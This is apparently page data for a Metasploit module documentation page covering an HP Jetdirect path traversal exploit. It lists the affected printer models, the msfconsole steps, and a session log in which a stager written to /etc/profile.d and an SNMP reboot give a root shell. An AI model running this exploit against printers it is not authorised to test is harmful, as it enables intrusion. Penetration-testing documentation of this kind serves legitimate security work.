{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/misc/hp_jetdirect_path_traversal","result":{"data":{"moduleMetadataJson":{"id":"b3a00656-14e3-533a-bdc3-40b1c51ddf0d","name":"HP Jetdirect Path Traversal Arbitrary Code Execution","fullname":"exploit/linux/misc/hp_jetdirect_path_traversal","description":"The module exploits a path traversal via Jetdirect to gain arbitrary code execution by\n        writing a shell script that is loaded on startup to /etc/profile.d. Then, the printer\n        is restarted using SNMP. Impacted printers:\n        HP PageWide Managed MFP P57750dw\n        HP PageWide Managed P55250dw\n        HP PageWide Pro MFP 577z\n        HP PageWide Pro 552dw\n        HP PageWide Pro MFP 577dw\n        HP PageWide Pro MFP 477dw\n        HP PageWide Pro 452dw\n        HP PageWide Pro MFP 477dn\n        HP PageWide Pro 452dn\n        HP PageWide MFP 377dw\n        HP PageWide 352dw\n        HP OfficeJet Pro 8730 All-in-One Printer\n        HP OfficeJet Pro 8740 All-in-One Printer\n        HP OfficeJet Pro 8210 Printer\n        HP OfficeJet Pro 8216 Printer\n        HP OfficeJet Pro 8218 Printer\n\n        Please read the module documentation regarding the possibility for leaving an\n        unauthenticated telnetd service running as a side effect of this exploit.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/linux/misc/hp_jetdirect_path_traversal","documentationSlug":"/modules/documentation/exploit/linux/misc/hp_jetdirect_path_traversal","referencesSlug":"/modules/references/exploit/linux/misc/hp_jetdirect_path_traversal"},"documentation":{"html":"<h2 id=\"vulnerable-devices\" style=\"position:relative;\"><a href=\"#vulnerable-devices\" aria-label=\"vulnerable devices permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Devices</h2>\n<p>  Impacted printers have a firmware version below 1708D.</p>\n<table>\n<thead>\n<tr>\n<th>Product Name</th>\n<th>Model</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HP PageWide Managed MFP P57750dw</td>\n<td>J9V82A, J9V82B, J9V82C, J9V82D</td>\n</tr>\n<tr>\n<td>HP PageWide Managed P55250dw</td>\n<td>J6U55A, J6U55B, J6U55C, J6U55D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro MFP 577z</td>\n<td>K9Z76A, K9Z76D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro 552dw</td>\n<td>D3Q17A, D3Q17C, D3Q17D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro MFP 577dw</td>\n<td>D3Q21A, D3Q21C, D3Q21D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro MFP 477dw</td>\n<td>D3Q20A, D3Q20B, D3Q20C, D3Q20D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro  452dw</td>\n<td>D3Q16A, D3Q16B, D3Q16C, D3Q16D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro MFP 477dn</td>\n<td>D3Q19A, D3Q19D</td>\n</tr>\n<tr>\n<td>HP PageWide Pro  452dn</td>\n<td>D3Q15A, D3Q15B, D3Q15D</td>\n</tr>\n<tr>\n<td>HP PageWide MFP 377dw</td>\n<td>J9V80A, J9V80B</td>\n</tr>\n<tr>\n<td>HP PageWide 352dw</td>\n<td>J6U57B</td>\n</tr>\n<tr>\n<td>HP OfficeJet Pro 8730 All-in-One Printer</td>\n<td>D9L20A</td>\n</tr>\n<tr>\n<td>HP OfficeJet Pro 8740 All-in-One Printer</td>\n<td>D9L21A</td>\n</tr>\n<tr>\n<td>HP OfficeJet Pro 8210 Printer</td>\n<td>D9L63A, D9L64A</td>\n</tr>\n<tr>\n<td>HP OfficeJet Pro 8216 Printer</td>\n<td>T0G70A</td>\n</tr>\n<tr>\n<td>HP OfficeJet Pro 8218 Printer</td>\n<td>J3P68A</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/misc/hp_jetdirect_path_traversal</code></li>\n<li>Do: <code class=\"language-text\">set rhost &lt;hostname&gt;</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"hp-officejet-pro-8210-printer\" style=\"position:relative;\"><a href=\"#hp-officejet-pro-8210-printer\" aria-label=\"hp officejet pro 8210 printer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HP OfficeJet Pro 8210 Printer</h3>\n<p>  The following demonstrates the exploit against a vulnerable printer model.\nWhen the user is finished with the command shell session, they press control-c and\nrespond yes to abort the session. This action sends the <code class=\"language-text\">CommandShellCleanupCommand</code>\nof the <code class=\"language-text\">cmd/unix/bind_busybox_telnetd</code> payload to the server in order to kill\ntelnetd that was used to get the command shell.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/misc/hp_jetdirect_path_traversal\nmsf exploit(linux/misc/hp_jetdirect_path_traversal) &gt; set rhost 192.168.1.107\nrhost =&gt; 192.168.1.107\nmsf exploit(linux/misc/hp_jetdirect_path_traversal) &gt; exploit\n\n[*] 192.168.1.107:9100 - Exploiting...\n[*] Started bind handler\n[*] 192.168.1.107:9100 - Connecting to port 9100...\n[*] 192.168.1.107:9100 - Attempting to write command stager...\n[+] 192.168.1.107:9100 - Successfully wrote command stager to 0:/../../rw/var/etc/profile.d/dLDZtDsh.sh\n[*] 192.168.1.107:161 - Connecting to SNMP port 161...\n[*] 192.168.1.107:161 - Initial value of prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 =&gt; 3\n[*] 192.168.1.107:161 - Attempting to restart printer via SNMP...\n[*] 192.168.1.107:161 - Set prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 =&gt; 4\n[*] 192.168.1.107:161 - Current value of prtGeneralReset OID 1.3.6.1.2.1.43.5.1.1.3.1 =&gt; 3\n[*] 192.168.1.107:161 - Printer restarting...\n[*] Command shell session 1 opened (192.168.1.101:38141 -&gt; 192.168.1.107:4444) at 2017-12-31 21:09:40 -0600\n\n\n[root@HPC2A3FB ]# id\nid\nuid=0(root) gid=0(root)\n[root@HPC2A3FB ]# uname -a\nuname -a\nLinux HPC2A3FB 3.14.32 #001.1614A Wed Mar 30 16:58:30 PDT 2016 armv7l GNU/Linux\n[root@HPC2A3FB ]# ^C\nAbort session 1? [y/N]  y\n\n[*] 192.168.1.107 - Command shell session 1 closed.  Reason: User exit\nmsf exploit(linux/misc/hp_jetdirect_path_traversal) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"notes\" style=\"position:relative;\"><a href=\"#notes\" aria-label=\"notes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes</h2>\n<p>  The shell cleanup command should result in the payload automatically terminating\nthe telnetd service as the session completes. However, intermittent behavior was\nobserved and the source has not been identified. When closing a session please\nverify, via a port scan or other desired method, that the port is no longer open.\nIf the port remains open, then the unauthenticated telnetd service is still running.\nEstablish a connection to the unauthenticated telnetd service and manually terminate\nthe process (<code class=\"language-text\">pkill telnetd</code>) to avoid leaving the host more insecure.</p>"}}},"pageContext":{"id":"b3a00656-14e3-533a-bdc3-40b1c51ddf0d"}}}